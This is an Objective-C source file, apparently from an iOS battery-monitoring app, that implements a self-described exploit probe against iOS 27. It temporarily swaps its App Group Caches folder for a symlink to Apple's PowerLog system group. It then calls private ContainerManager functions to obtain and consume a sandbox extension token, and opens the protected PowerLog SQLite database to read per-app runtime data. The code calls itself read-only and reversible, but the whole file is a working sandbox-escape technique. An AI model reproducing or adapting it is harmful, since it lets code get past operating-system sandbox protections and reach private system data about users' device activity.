#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <sqlite3.h>
#import <sys/file.h>
#import <sys/stat.h>
#import <unistd.h>
#import <xpc/xpc.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// An independently written, narrowly scoped reader for the PowerLog system
// group. Its only exploit-side mutation is a reversible swap of *our own*
// App Group's Library/Caches entry. Never write to Apple's PowerLog database.
static NSString *const VSPowerLogGroup = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.powerlog";
static NSString *const VSPreservedCaches = @".voltscope-preserved-caches";
static NSString *const VSCacheLock = @".voltscope-cache-lock";

typedef struct __SecTask *VSSecTaskRef;
extern VSSecTaskRef SecTaskCreateFromSelf(CFAllocatorRef allocator);
extern CFTypeRef SecTaskCopyValueForEntitlement(VSSecTaskRef task, CFStringRef entitlement, CFErrorRef *error);

static NSString *VSErrnoDescription(int code) {
    return [NSString stringWithFormat:@"%s (errno=%d)", strerror(code), code];
}

static NSString *VSAppGroup(void) {
    VSSecTaskRef task = SecTaskCreateFromSelf(kCFAllocatorDefault);
    if (!task) return nil;
    CFTypeRef value = SecTaskCopyValueForEntitlement(task, CFSTR("com.apple.security.application-groups"), NULL);
    CFRelease(task);
    if (!value) return nil;
    NSArray *groups = CFBridgingRelease(value);
    if (![groups isKindOfClass:NSArray.class]) return nil;
    for (id item in groups) {
        if (![item isKindOfClass:NSString.class]) continue;
        if ([NSFileManager.defaultManager containerURLForSecurityApplicationGroupIdentifier:item]) return item;
    }
    return nil;
}

static NSString *VSLibrary(NSString *group) {
    NSURL *root = [NSFileManager.defaultManager containerURLForSecurityApplicationGroupIdentifier:group];
    return root ? [root.path stringByAppendingPathComponent:@"Library"] : nil;
}

// Recover a swap interrupted by process termination. Never delete a directory
// or overwrite a pre-existing entry. If the situation is ambiguous, fail shut.
static BOOL VSRestoreCaches(int dir, NSString **detail) {
    struct stat backup = {0}, cache = {0};
    BOOL hasBackup = fstatat(dir, VSPreservedCaches.UTF8String, &backup, AT_SYMLINK_NOFOLLOW) == 0;
    if (!hasBackup) return YES;
    if (!S_ISDIR(backup.st_mode)) {
        if (detail) *detail = @"Recovery blocked: reserved backup is not a directory";
        return NO;
    }
    BOOL hasCache = fstatat(dir, "Caches", &cache, AT_SYMLINK_NOFOLLOW) == 0;
    if (hasCache) {
        if (!S_ISLNK(cache.st_mode)) {
            if (detail) *detail = @"Recovery blocked: Caches has been replaced by another directory";
            return NO;
        }
        char target[2048] = {0};
        ssize_t n = readlinkat(dir, "Caches", target, sizeof(target) - 1);
        if (n < 0 || ![VSPowerLogGroup isEqualToString:[NSString stringWithUTF8String:target]]) {
            if (detail) *detail = @"Recovery blocked: Caches symlink has an unexpected target";
            return NO;
        }
        if (unlinkat(dir, "Caches", 0) != 0) {
            if (detail) *detail = [@"Recovery unlink: " stringByAppendingString:VSErrnoDescription(errno)];
            return NO;
        }
    }
    if (renameat(dir, VSPreservedCaches.UTF8String, dir, "Caches") != 0) {
        if (detail) *detail = [@"Recovery rename: " stringByAppendingString:VSErrnoDescription(errno)];
        return NO;
    }
    return YES;
}

static BOOL VSWithLockedLibrary(NSString *group, BOOL (^body)(int, NSString **), NSString **detail) {
    NSString *path = VSLibrary(group);
    if (!path) { if (detail) *detail = @"No accessible App Group library"; return NO; }
    NSError *createError = nil;
    if (![NSFileManager.defaultManager createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:&createError]) {
        if (detail) *detail = [NSString stringWithFormat:@"App Group Library creation failed: %@", createError.localizedDescription];
        return NO;
    }
    int dir = open(path.fileSystemRepresentation, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
    if (dir < 0) { if (detail) *detail = VSErrnoDescription(errno); return NO; }
    int lock = openat(dir, VSCacheLock.UTF8String, O_RDWR | O_CREAT | O_CLOEXEC | O_NOFOLLOW, 0600);
    if (lock < 0 || flock(lock, LOCK_EX | LOCK_NB) != 0) {
        if (detail) *detail = @"App Group Caches is busy or lock access denied";
        if (lock >= 0) close(lock);
        close(dir);
        return NO;
    }
    BOOL okay = body(dir, detail);
    flock(lock, LOCK_UN);
    close(lock);
    close(dir);
    return okay;
}

NSString *VSRecoverPowerLogCache(void) {
    NSString *group = VSAppGroup();
    if (!group) return @"No signed App Group";
    NSString *detail = nil;
    BOOL okay = VSWithLockedLibrary(group, ^BOOL(int dir, NSString **error) {
        return VSRestoreCaches(dir, error);
    }, &detail);
    return okay ? @"Ready" : (detail ?: @"Unable to restore App Group Caches");
}

typedef void *(*VSQueryCreate)(void);
typedef void (*VSQuerySetInt)(void *, uint64_t);
typedef void (*VSQuerySetGroup)(void *, xpc_object_t);
typedef void *(*VSQuerySingle)(void *);
typedef char *(*VSQueryToken)(void *);
typedef void (*VSQueryFree)(void *);
typedef int64_t (*VSConsume)(const char *);
typedef int (*VSRelease)(int64_t);

static int64_t VSGrantSystemGroup(NSString *group, uint64_t flags, NSString **detail) {
    void *lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!lib) { if (detail) *detail = @"ContainerManager unavailable"; return -1; }
    VSQueryCreate queryCreate = (VSQueryCreate)dlsym(lib, "container_query_create");
    VSQuerySetInt setClass = (VSQuerySetInt)dlsym(lib, "container_query_set_class");
    VSQuerySetGroup setGroup = (VSQuerySetGroup)dlsym(lib, "container_query_set_group_identifiers");
    VSQuerySetInt setPart = (VSQuerySetInt)dlsym(lib, "container_query_operation_set_part");
    VSQuerySetInt setFlags = (VSQuerySetInt)dlsym(lib, "container_query_operation_set_flags");
    VSQuerySingle single = (VSQuerySingle)dlsym(lib, "container_query_get_single_result");
    VSQueryToken copyToken = (VSQueryToken)dlsym(lib, "container_copy_sandbox_token");
    VSQueryFree freeQuery = (VSQueryFree)dlsym(lib, "container_query_free");
    VSConsume consume = (VSConsume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!queryCreate || !setClass || !setGroup || !setPart || !setFlags || !single || !copyToken || !freeQuery || !consume) {
        if (detail) *detail = @"ContainerManager token APIs unavailable";
        return -2;
    }
    __block int64_t handle = -3;
    NSString *swapIssue = nil;
    BOOL restored = VSWithLockedLibrary(group, ^BOOL(int dir, NSString **error) {
        if (!VSRestoreCaches(dir, error)) return NO;
        struct stat st = {0};
        if (fstatat(dir, "Caches", &st, AT_SYMLINK_NOFOLLOW) != 0) {
            if (mkdirat(dir, "Caches", 0700) != 0) { *error = VSErrnoDescription(errno); return NO; }
        } else if (!S_ISDIR(st.st_mode)) {
            *error = @"Caches is not an ordinary directory";
            return NO;
        }
        if (fstatat(dir, VSPreservedCaches.UTF8String, &st, AT_SYMLINK_NOFOLLOW) == 0) {
            *error = @"Previous Caches backup still exists";
            return NO;
        }
        if (renameat(dir, "Caches", dir, VSPreservedCaches.UTF8String) != 0) {
            *error = [@"Preserve Caches: " stringByAppendingString:VSErrnoDescription(errno)];
            return NO;
        }
        if (symlinkat(VSPowerLogGroup.fileSystemRepresentation, dir, "Caches") != 0) {
            *error = [@"Swap Caches: " stringByAppendingString:VSErrnoDescription(errno)];
            if (!VSRestoreCaches(dir, error)) return NO;
            return NO;
        }
        @try {
            void *query = queryCreate();
            if (query) {
                setClass(query, 7); // Query only our App Group; the target is the temporary symlink.
                xpc_object_t identifier = xpc_string_create(group.UTF8String);
                setGroup(query, identifier);
                // The iOS SDK bridges xpc_object_t to Objective-C under ARC;
                // explicit xpc_release expands to forbidden -release.
                setPart(query, 3); // Library/Caches
                setFlags(query, flags);
                void *result = single(query);
                char *token = result ? copyToken(result) : NULL;
                if (token) {
                    handle = consume(token);
                    free(token);
                } else {
                    handle = -5;
                }
                freeQuery(query);
            }
        } @catch (NSException *exception) {
            *error = @"ContainerManager query raised an exception";
            handle = -6;
        } @finally {
            if (!VSRestoreCaches(dir, error)) handle = -7;
        }
        return handle >= 0;
    }, &swapIssue);
    if (!restored && detail) *detail = swapIssue ?: [NSString stringWithFormat:@"Token unavailable (code=%lld)", handle];
    return restored ? handle : -8;
}

static NSString *VSQuotedSQL(NSString *name) {
    return [NSString stringWithFormat:@"\"%@\"", [name stringByReplacingOccurrencesOfString:@"\"" withString:@"\"\""]];
}

// Query introspection instead of assuming Apple's private table layout stays
// constant. Runtime numbers are explicitly not converted into watts.
static NSDictionary<NSString *, NSString *> *VSReadSchema(NSString *dbPath) {
    sqlite3 *db = NULL;
    int rc = sqlite3_open_v2(dbPath.fileSystemRepresentation, &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_FULLMUTEX, NULL);
    if (rc != SQLITE_OK) {
        NSString *error = [NSString stringWithFormat:@"SQLite open failed (%d): %s", rc, db ? sqlite3_errmsg(db) : "unknown"];
        if (db) sqlite3_close(db);
        return @{ @"schema": error };
    }
    sqlite3_busy_timeout(db, 100);
    sqlite3_exec(db, "PRAGMA query_only=ON", NULL, NULL, NULL);
    sqlite3_stmt *stmt = NULL;
    const char *sql = "SELECT name FROM sqlite_master WHERE type='table' AND (lower(name) LIKE '%app%' OR lower(name) LIKE '%energy%' OR lower(name) LIKE '%battery%') ORDER BY name LIMIT 48";
    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
    NSMutableArray<NSString *> *tables = [NSMutableArray new];
    if (rc == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char *name = (const char *)sqlite3_column_text(stmt, 0);
            if (name) [tables addObject:[NSString stringWithUTF8String:name]];
        }
    }
    if (stmt) sqlite3_finalize(stmt);
    NSMutableArray<NSString *> *runtime = [NSMutableArray new];
    for (NSString *table in tables) {
        if (![table.lowercaseString containsString:@"runtime"]) continue;
        NSString *pragma = [NSString stringWithFormat:@"PRAGMA table_info(%@)", VSQuotedSQL(table)];
        sqlite3_stmt *columns = NULL;
        if (sqlite3_prepare_v2(db, pragma.UTF8String, -1, &columns, NULL) != SQLITE_OK) continue;
        NSString *appColumn = nil;
        NSString *backgroundColumn = nil;
        while (sqlite3_step(columns) == SQLITE_ROW) {
            const char *raw = (const char *)sqlite3_column_text(columns, 1);
            if (!raw) continue;
            NSString *name = [NSString stringWithUTF8String:raw];
            NSString *lower = name.lowercaseString;
            if ([lower isEqualToString:@"bundleid"] || [lower isEqualToString:@"bundleidentifier"] || [lower isEqualToString:@"appidentifier"]) appColumn = name;
            if ([lower containsString:@"background"] && ([lower containsString:@"time"] || [lower containsString:@"duration"])) backgroundColumn = name;
        }
        sqlite3_finalize(columns);
        if (!appColumn || !backgroundColumn) continue;
        NSString *query = [NSString stringWithFormat:@"SELECT %@, SUM(CAST(%@ AS REAL)) FROM %@ WHERE %@ IS NOT NULL GROUP BY 1 ORDER BY 2 DESC LIMIT 12", VSQuotedSQL(appColumn), VSQuotedSQL(backgroundColumn), VSQuotedSQL(table), VSQuotedSQL(appColumn)];
        sqlite3_stmt *rows = NULL;
        if (sqlite3_prepare_v2(db, query.UTF8String, -1, &rows, NULL) == SQLITE_OK) {
            while (sqlite3_step(rows) == SQLITE_ROW) {
                const char *app = (const char *)sqlite3_column_text(rows, 0);
                if (app) [runtime addObject:[NSString stringWithFormat:@"%@ : %.0f (raw runtime units)", [NSString stringWithUTF8String:app], sqlite3_column_double(rows, 1)]];
            }
        }
        if (rows) sqlite3_finalize(rows);
        break;
    }
    NSString *schema = [tables componentsJoinedByString:@", "];
    sqlite3_close(db);
    return @{ @"schema": schema.length ? schema : @"No recognizable PowerLog app/energy tables", @"runtime": [runtime componentsJoinedByString:@"\n"] };
}

NSDictionary<NSString *, NSString *> *VSProbePowerLog(void) {
    NSMutableDictionary<NSString *, NSString *> *result = [@{ @"status": @"Not checked", @"details": @"", @"schema": @"", @"runtime": @"" } mutableCopy];
    if (NSProcessInfo.processInfo.operatingSystemVersion.majorVersion < 27) {
        result[@"status"] = @"Unsupported iOS version";
        result[@"details"] = @"This narrowly scoped worse_query probe targets iOS 27 system groups.";
        return result;
    }
    NSString *group = VSAppGroup();
    if (!group) {
        result[@"status"] = @"App Group entitlement missing";
        result[@"details"] = @"The installed signing profile must preserve an App Group.";
        return result;
    }
    result[@"details"] = [NSString stringWithFormat:@"Signed App Group: %@", group];
    struct stat st = {0};
    // An initial lstat may be denied by the sandbox itself. Don't treat that
    // as proof the directory is absent before attempting a temporary grant.
    int statRC = lstat(VSPowerLogGroup.fileSystemRepresentation, &st);
    int statErr = statRC == 0 ? 0 : errno;
    NSString *batteryFolder = [VSPowerLogGroup stringByAppendingPathComponent:@"Library/BatteryLife"];
    NSString *dbPath = [batteryFolder stringByAppendingPathComponent:@"CurrentPowerlog.PLSQL"];
    int fd = open(dbPath.fileSystemRepresentation, O_RDONLY | O_NOFOLLOW | O_CLOEXEC);
    int directErr = fd < 0 ? errno : 0;
    int64_t grant = -1;
    NSString *grantDetail = nil;
    if (fd < 0) {
        grant = VSGrantSystemGroup(group, 0x0000008000000000ULL, &grantDetail);
        if (grant < 0) grant = VSGrantSystemGroup(group, 0x0000000800000000ULL, &grantDetail);
        if (grant >= 0) fd = open(dbPath.fileSystemRepresentation, O_RDONLY | O_NOFOLLOW | O_CLOEXEC);
    }
    int finalErr = fd < 0 ? errno : 0;
    result[@"details"] = [NSString stringWithFormat:@"%@\nSystem group stat: %@\nDirect read: %@\nSandbox grant: %@\n%s", result[@"details"], statErr ? VSErrnoDescription(statErr) : @"Allowed", directErr ? VSErrnoDescription(directErr) : @"Allowed", grant >= 0 ? @"Consumed" : (grantDetail ?: @"Unavailable"), "PowerLog is read-only; no target data is changed."];
    if (fd < 0) {
        result[@"status"] = @"PowerLog read blocked";
        result[@"details"] = [result[@"details"] stringByAppendingFormat:@"\nFinal read: %@", VSErrnoDescription(finalErr)];
    } else {
        char magic[16] = {0};
        ssize_t bytes = pread(fd, magic, sizeof(magic), 0);
        fstat(fd, &st);
        BOOL valid = bytes == 16 && memcmp(magic, "SQLite format 3\0", 16) == 0;
        result[@"status"] = valid ? @"PowerLog database accessible" : @"PowerLog file opened, format unexpected";
        result[@"details"] = [result[@"details"] stringByAppendingFormat:@"\nFile bytes: %lld\nSQLite magic: %@", (long long)st.st_size, valid ? @"Valid" : @"Missing/unknown"];
        close(fd);
        if (valid) [result addEntriesFromDictionary:VSReadSchema(dbPath)];
    }
    if (grant >= 0) {
        VSRelease release = (VSRelease)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
        if (release) release(grant);
    }
    return result;
}
